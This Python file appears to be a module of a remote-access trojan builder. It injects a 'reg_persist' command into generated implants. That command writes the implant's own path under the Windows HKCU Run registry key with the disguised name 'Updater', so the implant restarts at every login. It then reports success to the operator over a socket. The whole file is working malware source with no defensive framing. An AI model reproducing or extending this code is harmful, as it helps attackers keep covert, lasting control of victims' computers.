# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(option):
    if option == 'generate':
        config.import_statements.append('import winreg')
        config.import_statements.append('from sys import argv')
        config.import_statements.append('from os import getcwd, path')
        config.functions.append('''
def registry_persist(path):
    reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    key = winreg.CreateKeyEx(reg,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,winreg.KEY_WRITE)
    winreg.SetValueEx(key, 'Updater',0,winreg.REG_SZ, path)
    winreg.FlushKey(key)
    winreg.CloseKey(key)
    winreg.CloseKey(reg)
    s.sendall('[+]Persistence via registry achieved'.encode())''')
        config.logics.append('''
            elif command == "reg_persist":
                registry_persist(path.join(getcwd(),path.abspath(argv[0])))''')
        config.help_menu[
            'reg_persist'] = 'This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "Registry Persistence component",
                "OS": "Windows",
                "Required Modules": "winreg, sys, os",
                "Commands": "reg_persist",
                "Description": "This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path"}
        elif interface == "CUI":
            print('\nName             : Registry Persistence component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : winreg, sys, os' \
                  '\nCommands         : reg_persist' \
                  '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path')

